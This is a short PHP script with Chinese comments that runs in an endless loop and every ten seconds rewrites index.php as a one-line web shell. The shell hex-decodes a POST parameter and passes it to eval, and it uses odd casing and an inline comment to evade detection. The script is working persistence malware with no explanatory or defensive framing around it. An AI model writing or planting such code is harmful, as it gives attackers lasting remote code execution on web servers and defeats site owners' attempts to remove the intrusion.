<?php
set_time_limit(0);
ignore_user_abort(1);

$hash = ''; // 预存的哈希值

while (true) {
    if (!file_exists('index.php') || hash_file('sha256', 'index.php') !== $hash) {
        file_put_contents('index.php', "<?php \$a = filter_input(INPUT_POST,'c');EvAl/**/(\hex2bin(\$a));?>");
        
        // 更新预存的哈希值
        $hash = hash_file('sha256', 'index.php');
    }
    
    sleep(10); // 间隔时间
}
?>